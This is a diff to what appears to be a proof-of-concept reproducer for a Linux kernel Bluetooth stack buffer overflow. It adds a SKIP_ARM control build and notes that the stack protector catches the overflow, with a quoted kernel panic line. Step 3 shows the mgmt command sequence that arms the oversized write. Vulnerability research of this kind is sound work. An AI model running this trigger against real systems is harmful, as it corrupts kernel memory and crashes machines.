@@ -33,8 +33,15 @@
  * Structurally identical to the verified enc_key_size bug: a validator runs
  * once at set time, and a later unvalidated write invalidates its conclusion.
  *
- * Requires CONFIG_KASAN_STACK=y to be observed -- the 4 bytes land in adjacent
- * stack slots, not on the canary, so STACKPROTECTOR alone will likely miss it.
+ * Detectability: the expectation was that this would need CONFIG_KASAN_STACK,
+ * on the assumption that 4 bytes would land in adjacent stack slots rather than
+ * on the canary. That was wrong -- CONFIG_STACKPROTECTOR_STRONG catches it
+ * directly:
+ *
+ *   Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in:
+ *       hci_set_ext_scan_rsp_data_sync+0x3b5/0x3e0
+ *
+ * so no KASAN_STACK build is required.
  */
 #include "common.h"
 #include <sys/wait.h>
@@ -248,11 +255,15 @@ int main(void)
 		/* 3. re-issue params for the SAME instance, now WITH the appearance
 		 *    flag. flags are replaced; scan_rsp_len is not reset because
 		 *    hci_set_adv_instance_data() only assigns it when non-zero. */
+#ifndef SKIP_ARM
 		memset(params, 0, sizeof(params));
 		params[0] = 1;
 		params[1] = MGMT_ADV_FLAG_APPEARANCE & 0xff;   /* flags, LE u32 */
 		mgmt_send(MGMT_OP_ADD_EXT_ADV_PARAMS, params, 18);
 		logf("step3: ADD_EXT_ADV_PARAMS instance=1 flags=APPEARANCE  <-- ARM");
+#else
+		logf("step3: CONTROL - flags re-issue skipped");
+#endif
 
 		/* 4. any data update now re-runs the scan-rsp sync, which writes
 		 *    4 + 251 bytes into the 251-byte stack buffer. */
